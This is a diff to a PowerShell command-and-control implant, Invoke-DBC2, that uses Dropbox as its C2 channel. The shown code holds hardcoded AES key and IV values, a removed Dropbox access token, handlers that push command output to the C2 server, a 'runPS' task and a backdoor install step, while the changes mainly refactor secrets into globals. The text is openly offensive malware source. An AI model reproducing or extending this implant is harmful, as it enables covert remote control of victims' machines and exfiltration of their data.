@@ -1,7 +1,10 @@
 Function Invoke-DBC2{
 
     Function Invoke-Bot{
-            
+
+            $Global:secretIV = "Key@123Key@123fd"
+            $Global:SecretKey = "secret#456!23key"
+
             Function Aes-Decrypt($DecryptData){    
 
                 #Use the AES cipher and represent it as an object.
@@ -11,12 +14,12 @@ Function Invoke-DBC2{
                 $AES.BlockSize = 128
                 $AES.KeySize = 128
                 $enc = [system.Text.Encoding]::UTF8
-                $AES.IV = $enc.GetBytes('Key@123Key@123fd')
+                $AES.IV = $enc.GetBytes($Global:secretIV)
     
                 # $AES.Key = [byte[]] @( 1..32 )
    
                 $enc = [system.Text.Encoding]::UTF8
-                $key = $enc.GetBytes('secret#456!23key') 
+                $key = $enc.GetBytes($Global:SecretKey) 
                 $AES.Key = $key
                 $Decryptor = $AES.CreateDecryptor()
 
@@ -96,7 +99,7 @@ Function Invoke-DBC2{
 
             class dropbox{   
                     # Static Properties
-                    static [String] $ApiKey = "qkwLVnGMbKAAAAAAAAAADatC6sz__QhZG0aEWZhx0TlWIOIVGXpUP7084vCnnnD2"
+                    static [String] $ApiKey = " " #Insert DropBox AccessToken Here
                     static [String] $TargetfilePath
                     static [String] $root = "dropbox"
 
@@ -344,6 +347,7 @@ Function Invoke-DBC2{
             $C2StatusFile = "/" + $c2_agentID + ".status"
             $C2CmdFile = "/" + $c2_agentID + ".cmd"
 
+            New-Item ".\Untitled.ps1"
             $C2CmdFileLastRevNumber = [dropbox]::dropboxPutfile($C2CmdFile,".\Untitled.ps1")
             $C2StatusFileLastRevNumber = [dropbox]::dropboxPutfile($C2StatusFile,".\Untitled.ps1")
 
@@ -577,7 +581,6 @@ Function Invoke-DBC2{
                             $result >>  "C:\ps\test4.txt"
                             $dataness = "C:\ps\test4.txt"
 
-
                             # Push the command result to the C2 server
                             [dropbox]::dropboxPutfile($taskResultFile,$dataness)
 
@@ -622,9 +625,7 @@ Function Invoke-DBC2{
                              
 		                             Write-Output "$Tab $Tab Failed To Install Backdoor"
                                      Break 
-
 	                            }
-
                             }
 
                          "runPS"{
@@ -651,11 +652,7 @@ Function Invoke-DBC2{
                              [dropbox]::dropboxPutfile($taskResultFile,$PSFile)
                              rm "C:\ps\test.txt"
 
-                         }
-
-
-                        
-               
+                         }             
                     }                        
                 }   
             }
